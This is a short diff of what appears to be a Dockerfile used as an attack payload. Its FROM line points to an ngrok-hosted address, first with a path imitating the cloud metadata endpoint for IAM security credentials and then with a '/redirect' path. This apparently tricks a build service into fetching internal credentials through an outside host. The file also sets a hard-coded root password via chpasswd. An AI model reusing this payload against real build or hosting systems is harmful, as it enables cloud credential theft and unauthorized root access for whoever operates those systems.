@@ -1,4 +1,4 @@
-FROM dd79df89.ngrok.io/latest/meta-data/iam/security-credentials/ 
+FROM dd79df89.ngrok.io/redirect
 
 #Run entry script
 RUN echo "root:Docker!" | chpasswd
